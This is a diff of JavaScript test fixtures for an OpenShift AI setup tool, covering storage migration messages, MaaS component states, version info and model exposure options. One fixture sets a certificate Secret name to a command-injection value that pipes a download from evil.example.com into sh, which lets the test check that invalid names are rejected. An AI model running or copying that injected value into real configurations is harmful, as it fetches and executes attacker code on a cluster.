@@ -495,9 +495,9 @@ export const s3States = {
   // Namespace seaweedfs exists, made by someone else: setup refuses.
   foreign: {
     deployed: false, ready: false, namespace: "seaweedfs", managedByTool: false,
-    message: "Namespace 'seaweedfs' exists but was not created by this tool, so setup will not modify it.",
-    setupBlockedReason: "Namespace 'seaweedfs' exists but was not created by this tool, so setup will not modify it.",
-    teardownBlockedReason: "Namespace 'seaweedfs' was not created by this tool.",
+    message: "Namespace seaweedfs exists but was not created by this tool, so setup will not modify it.",
+    setupBlockedReason: "Namespace seaweedfs exists but was not created by this tool, so setup will not modify it.",
+    teardownBlockedReason: "Namespace seaweedfs was not created by this tool.",
   },
   // Storage of an earlier version is still in namespace minio: nothing in
   // namespace seaweedfs yet, or (stage "remove") the new storage is running.
@@ -535,24 +535,24 @@ export function legacyStorage(stage) {
 export function migrateSteps(kind) {
   const rows = kind === "migrate"
     ? [
-      ["check", "running", "Checking the storage in namespace 'minio'..."],
-      ["check", "success", "OK: SeaweedFS in namespace 'minio' is running"],
-      ["storage", "running", "Setting up the storage in namespace 'seaweedfs' with new keys..."],
+      ["check", "running", "Checking the storage in namespace minio..."],
+      ["check", "success", "OK: SeaweedFS in namespace minio is running"],
+      ["storage", "running", "Setting up the storage in namespace seaweedfs with new keys..."],
       ["storage", "success", "OK: The new storage is ready"],
-      ["copy", "running", "Copying every bucket and object from 'minio' to 'seaweedfs' (Job seaweedfs-migrate)..."],
+      ["copy", "running", "Copying every bucket and object from minio to 'seaweedfs' (Job seaweedfs-migrate)..."],
       ["copy", "success", "OK: 37 objects (18204511 bytes) copied and checked byte for byte"],
       ["repoint", "running", "Moving pipeline server dev-project/dspa..."],
       ["repoint", "success", "OK: 1 pipeline server moved"],
-      ["operation_complete", "success", "Migrated 37 objects (18204511 bytes) to namespace 'seaweedfs'. 1 pipeline server now uses it: dev-project/dspa. The old storage in namespace 'minio' is kept: delete it later from the S3 storage's menu, once nothing else uses it."],
+      ["operation_complete", "success", "Migrated 37 objects (18204511 bytes) to namespace seaweedfs. 1 pipeline server now uses it: dev-project/dspa. The old storage in namespace minio is kept: delete it later from the S3 storage's menu, once nothing else uses it."],
     ]
     : [
       ["check", "success", "OK: Nothing of this tool uses the old storage"],
-      ["copy", "running", "Copying every bucket and object from 'minio' to 'seaweedfs' (Job seaweedfs-migrate)..."],
+      ["copy", "running", "Copying every bucket and object from minio to 'seaweedfs' (Job seaweedfs-migrate)..."],
       ["copy", "success", "OK: 37 objects (18204511 bytes) copied and checked byte for byte"],
-      ["remove", "running", "Deleting the old storage in namespace 'minio'..."],
+      ["remove", "running", "Deleting the old storage in namespace minio..."],
       ["remove", "success", "OK: The old storage is deleted"],
-      ["namespace", "success", "OK: Namespace 'minio' is being deleted, with everything else in it"],
-      ["operation_complete", "success", "The old storage in namespace 'minio' was removed; its 37 objects (18204511 bytes) are in namespace 'seaweedfs'. Namespace 'minio' is being deleted, with everything else in it."],
+      ["namespace", "success", "OK: Namespace minio is being deleted, with everything else in it"],
+      ["operation_complete", "success", "The old storage in namespace minio was removed; its 37 objects (18204511 bytes) are in namespace seaweedfs. Namespace minio is being deleted, with everything else in it."],
     ];
   return rows.map(([step, status, message]) => ({ step, status, message }));
 }
@@ -699,7 +699,7 @@ export const modelsStatus = (over = {}) => {
 };
 
 /** The status's room check of one catalog model (pkg/cluster roomWarning). */
-export const CAPACITY_WARNING = "No worker seems to have room for the model: it needs 4 CPUs and 12Gi of memory free (up to 14Gi), and the most CPU free is 5.5 CPUs and 8.2 GiB on ip-10-0-1-23.ec2.internal.";
+export const CAPACITY_WARNING = "No worker seems to have room for the model: it needs 4 CPUs and 12 GiB of memory free (up to 14 GiB); the worker with the most free CPU, ip-10-0-1-23.ec2.internal, has 5.5 CPUs and 8.2 GiB free.";
 /** The catalog with that warning on Qwen3. */
 export const catalogWithoutRoom = (name = "qwen3-1-7b") => MODEL_CATALOG.map((c) => (c.name === name ? { ...c, capacityWarning: CAPACITY_WARNING } : c));
 
@@ -847,11 +847,11 @@ sdkVersion: kfp-2.13.0
 // --- Versions and the update check ---------------------------------------------
 
 export const versionInfo = (overrides = {}) => ({
-  version: "v3.0.1", commit: hex("v3.0.1", 40), buildDate: "2026-10-06T09:00:00Z", goVersion: "go1.25.1",
-  templateRevision: "5", expectedTemplateRevision: "5", templateOutdated: false, ...overrides,
+  version: "v4.0.0", commit: hex("v4.0.0", 40), buildDate: "2026-11-19T09:00:00Z", goVersion: "go1.25.1",
+  templateRevision: "7", expectedTemplateRevision: "7", templateOutdated: false, ...overrides,
 });
 
-export const noUpdate = { current: "v3.0.1", latest: "v3.0.1", updateAvailable: false, majorUpgrade: false };
+export const noUpdate = { current: "v4.0.0", latest: "v4.0.0", updateAvailable: false, majorUpgrade: false };
 
 // --- Diagnostics -----------------------------------------------------------------
 
@@ -959,10 +959,10 @@ oc -n kuadrant-system set env deployment/authorino \\
   SSL_CERT_FILE=/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt \\
   REQUESTS_CA_BUNDLE=/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt
 oc rollout restart deployment/authorino -n kuadrant-system`;
-const RHCL_WARNING = "Red Hat Connectivity Link 1.4.3 is installed; the MaaS docs ask for 1.5 or later with RHOAI 3.6: on 1.4.x a caller with two or more subscriptions can hang. MaaS works for a single subscription meanwhile. Upgrade Connectivity Link takes the upgrade path OLM offers, one channel at a time, and sets up Authorino TLS again afterwards.";
+const RHCL_WARNING = "Red Hat Connectivity Link 1.4.3 is installed; the MaaS docs ask for 1.5 or later: on 1.4.x a caller with two or more subscriptions can hang. MaaS works for a single subscription meanwhile. Upgrade Connectivity Link takes the upgrade path OLM offers, one channel at a time, and sets up Authorino TLS again afterwards.";
 const RHCL_UPGRADE = {
   id: "upgrade-rhcl", label: "Upgrade Connectivity Link",
-  summary: "Upgrades Red Hat Connectivity Link from 1.4.3 to 1.5 or later, as the MaaS docs ask with RHOAI 3.6, one channel at a time along the path OLM offers. Gateway authentication and rate limits restart during each step; it takes a few minutes.",
+  summary: "Upgrades Red Hat Connectivity Link from 1.4.3 to 1.5 or later, as the MaaS docs ask, one channel at a time along the path OLM offers. Gateway authentication and rate limits restart during each step; it takes a few minutes.",
   changes: [
     "Subscription kuadrant-system/kuadrant-operator: channel stable to stable-1.5 (version 1.5.0). OLM upgrades the operator; there is no way back to 1.4.3.",
     "If OLM has no path from 1.4.3 straight to 1.5.0 (it then stays at 1.4.3), channel stable-1.4 first, to 1.4.4, then stable-1.5.",
@@ -1006,7 +1006,7 @@ EOF
 oc wait --for=jsonpath='{.status.state}'=AtLatestKnown subscription/kuadrant-operator -n kuadrant-system --timeout=300s`;
 const AUTHORINO_ACTION = {
   id: "authorino-tls", label: "Configure Authorino TLS",
-  summary: "Applies the steps of the MaaS docs' setup-authorino-tls.sh to Connectivity Link's Authorino in kuadrant-system (missing: trust of the service CA (SSL_CERT_FILE)). Only what is not set yet changes; Authorino restarts. It stays after Remove: RHOAI's inference gateway uses Authorino too.",
+  summary: "Applies the steps of the MaaS docs' setup-authorino-tls.sh to Connectivity Link's Authorino in kuadrant-system (missing: trust of the service CA (SSL_CERT_FILE)). Only what is not set yet changes; Authorino restarts. It stays after Clean up: RHOAI's inference gateway uses Authorino too.",
   changes: [
     "Service kuadrant-system/authorino-authorino-authorization: annotation service.beta.openshift.io/serving-cert-secret-name=authorino-server-cert (service-ca makes the certificate)",
     "Authorino kuadrant-system/authorino: spec.listener.tls enabled, certSecretRef authorino-server-cert",
@@ -1040,20 +1040,20 @@ export function maasParts(state, { tls = true, rhcl = "1.4.3", tierPolicies = fa
       : { id: "rhcl", title: "Red Hat Connectivity Link", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", notManaged: true,
         message: `Version ${rhcl} runs (Subscription kuadrant-system/kuadrant-operator, channel ${rhcl === "1.4.3" ? "stable" : "stable-1.5"})`,
         ...(rhcl === "1.4.3" ? { warning: RHCL_WARNING, actions: [RHCL_UPGRADE], commands: RHCL_UPGRADE_COMMANDS } : {}) },
-    fresh ? { id: "kuadrant", title: "Kuadrant CR", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "missing",
+    fresh ? { id: "kuadrant", title: "Connectivity Link instance (Kuadrant)", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "missing",
       message: "No Kuadrant CR. Set up creates kuadrant-system/kuadrant once Connectivity Link runs, as the docs' platform setup does.", commands: "oc apply -f - <<'EOF'\napiVersion: kuadrant.io/v1beta1\nkind: Kuadrant\nmetadata:\n  name: kuadrant\n  namespace: kuadrant-system\nEOF" }
-      : { id: "kuadrant", title: "Kuadrant CR", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", message: "Kuadrant kuadrant-system/kuadrant is Ready", notManaged: true },
+      : { id: "kuadrant", title: "Connectivity Link instance (Kuadrant)", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", message: "kuadrant-system/kuadrant is ready", notManaged: true },
     !cnpg || fresh ? { id: "cnpg", title: "CloudNativePG operator", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`, state: "missing",
       message: "Not installed. Set up installs version 1.27.1 from certified-operators (channel stable-v1) for this tool's database. Or a cluster-admin creates Secret maas-db-config for a PostgreSQL of their own (maas-setup.md).",
       commands: "oc apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: cnpg-system\n---\napiVersion: operators.coreos.com/v1\nkind: OperatorGroup\nmetadata:\n  name: cloudnative-pg\n  namespace: cnpg-system\n---\napiVersion: operators.coreos.com/v1alpha1\nkind: Subscription\nmetadata:\n  name: cloudnative-pg\n  namespace: cnpg-system\nspec:\n  channel: stable-v1\n  installPlanApproval: Automatic\n  name: cloudnative-pg\n  source: certified-operators\n  sourceNamespace: openshift-marketplace\nEOF" }
       : { id: "cnpg", title: "CloudNativePG operator", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`, state: "ready", message: "Version 1.27.1 runs in cnpg-system", notManaged: true },
-    { id: "database", title: "Database (PostgreSQL) and maas-db-config", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`,
+    { id: "database", title: "Database", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`,
       ...(!on ? { state: "missing", message: "Not set up yet. Set up asks where MaaS keeps its API keys: your PostgreSQL, the MaaS docs' development database (one pod, ephemeral), or a persistent development database on CloudNativePG (this tool's own option, not in the MaaS docs)." }
         : tool ? { state: "ready", managedByTool: true, message: `CloudNativePG ${MAAS_INFRA}/maas-db runs (1 instance, development and test use; not in the MaaS docs: this tool's option); Secret maas-db-config set`,
           actions: [{ id: "change-database", label: "Change database", danger: true, summary: "Switches maas-api to another database. Every API key is lost: the new database starts empty.", changes: ["The Change database dialog lists what is created and deleted."] }] }
           : { state: "ready", notManaged: true, message: `Secret ${MAAS_INFRA}/maas-db-config exists: maas-api uses the database it names` }) },
-    { id: "gateway", title: "Gateway maas-default-gateway", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`,
-      ...(on ? { state: "ready", message: "Programmed at a1b2c3.elb.us-east-1.amazonaws.com", managedByTool: tool, notManaged: !tool }
+    { id: "gateway", title: "MaaS gateway", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`,
+      ...(on ? { state: "ready", message: "maas-default-gateway in openshift-ingress, programmed at a1b2c3.elb.us-east-1.amazonaws.com", managedByTool: tool, notManaged: !tool }
         : { state: "missing", message: `Set up creates it with an external load balancer at https://maas.${APPS}` }) },
     tls === "invalid-secret" ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "problem",
       message: "Not configured: the Service's serving certificate. Authorino's CR names its certificate Secret \"x$(curl -s evil.example.com | sh)\" (spec.listener.tls.certSecretRef.name), which is not a valid Kubernetes name, so no commands are shown. A cluster-admin checks Authorino authorino in kuadrant-system. Without it, API keys are refused." }
@@ -1082,7 +1082,7 @@ export function maasDatabase(state, { fresh = false, current: kind } = {}) {
     { id: "external", plan: [`Write Secret ${MAAS_INFRA}/maas-db-config (label app=maas-api) with the connection URL you enter; nothing else is created, and your database is never changed`] },
     { id: "development", plan: [`Run the MaaS docs' development PostgreSQL (scripts/setup-database.sh) in ${MAAS_INFRA}: Secret postgres-creds (a generated password), Deployment postgres (one pod, image registry.redhat.io/rhel9/postgresql-16@sha256:${"5".repeat(64)}, from the RHOAI operator's CSV (postgresql_16_image); no volume, so its data is lost when the pod restarts) and Service postgres, then Secret maas-db-config with its address (sslmode=disable, as the script does)`] },
     { id: "cnpg", plan: [
-      ...(fresh ? ["Install CloudNativePG 1.27.1: Namespace cnpg-system, OperatorGroup cnpg-system/cloudnative-pg, Subscription cnpg-system/cloudnative-pg (package cloudnative-pg, channel stable-v1, from certified-operators; in its own namespace, not openshift-operators, where an install can pull an OSSM upgrade that breaks the gateway; it stays after Remove)"] : []),
+      ...(fresh ? ["Install CloudNativePG 1.27.1: Namespace cnpg-system, OperatorGroup cnpg-system/cloudnative-pg, Subscription cnpg-system/cloudnative-pg (package cloudnative-pg, channel stable-v1, from certified-operators; in its own namespace, not openshift-operators, where an install can pull an OSSM upgrade that breaks the gateway; it stays after Clean up)"] : []),
       `Run a one-instance CloudNativePG database ${MAAS_INFRA}/maas-db (1 GiB volume, so keys survive restarts) and write Secret ${MAAS_INFRA}/maas-db-config with its address (sslmode=require)`] },
   ];
   const current = kind ?? (state === "none" ? "" : state === "foreign" ? "adopted" : "cnpg");
@@ -1186,12 +1186,15 @@ export function setMaaSPublished(resources, project, model, published, { maasOnl
   for (const [i, m] of items.entries()) {
     if (m.namespace !== project || m.name !== model) continue;
     if (published) {
-      items[i] = { ...m, maasPublished: true, ...(maasOnlySetup ? { maasOnlySetup: true } : {}) };
+      // As pkg/cluster reports a published model: routed through the MaaS gateway alone, its address the MaaS route's, its check MaaS's own.
+      const url = `https://maas.${APPS}/${project}/${model}`;
+      items[i] = { ...routed({ ...m, url }, { exposure: "maas", check: undefined }), maasPublished: true, ...(maasOnlySetup ? { maasOnlySetup: true } : {}),
+        callCheck: { result: "maas", ok: true, url, message: "MaaS lists the model (its reference is Ready). Calls go through MaaS with an API key, which this tool does not create: the MaaS tab's commands get one and call the model.", at: "2026-11-18T18:04:12Z" } };
       continue;
     }
     noRoute = !!m.maasOnlySetup;
     const { maasPublished: _p, maasOnlySetup: _o, ...rest } = m;
-    items[i] = noRoute ? routed(rest, { exposure: "internal", check: undefined }) : rest;
+    items[i] = noRoute ? routed(rest, { exposure: "internal", check: undefined }) : routed({ ...rest, url: `${INFERENCE}/${project}/${model}` });
   }
   const gw = resources?.inferenceGateway;
   if (!gw?.deployed || !gw.managedByTool) return;
@@ -1271,7 +1274,7 @@ export function modelExposures(project, model, gw, { maasReady = false, otherGat
     available: chat && maasReady, address: maasReady ? `https://maas.${APPS}` : undefined,
     reason: !chat ? "Only chat models are published to MaaS." : maasReady ? undefined : "MaaS isn't set up yet (Red Hat Connectivity Link is missing).",
     fix: chat && !maasReady ? "maas-tab" : undefined,
-    changes: chat && maasReady ? [`Gateway openshift-ingress/maas-default-gateway: admits routes from ${project}.`, `Published to MaaS: MaaSModelRef ${model} in ${project}, and this tool's subscription and access policy list the model.`] : undefined,
+    changes: chat && maasReady ? [`Gateway openshift-ingress/maas-default-gateway: admits routes from ${project}.`, `Published to MaaS: MaaSModelRef ${model} in ${project}, and this tool's subscription and authorization policy list the model.`] : undefined,
   };
   // Outside openshift-ingress: offered, never recommended (its token checks cannot be read).
   const other = otherGateway ? [{
@@ -1290,7 +1293,7 @@ export function modelExposures(project, model, gw, { maasReady = false, otherGat
     project, model, kserveDefaultGateway: GW_KEY, authReady, options,
     default: chosen?.key ?? "",
     defaultReason: chosen === def ? "works from your laptop with an OpenShift token, the way the dashboard deploys models."
-      : chosen === maas ? "MaaS is set up and the inference gateway can't be used: anyone signed in calls the model with a MaaS API key." : undefined,
+      : chosen === maas ? "MaaS is set up and the inference gateway can't be used: callers use a MaaS API key." : undefined,
     recommendGateway: !def.available,
     recommendGatewayReason: def.available ? undefined : "Set up the inference gateway to reach models from outside the cluster with an OpenShift token, as the dashboard does.",
   };
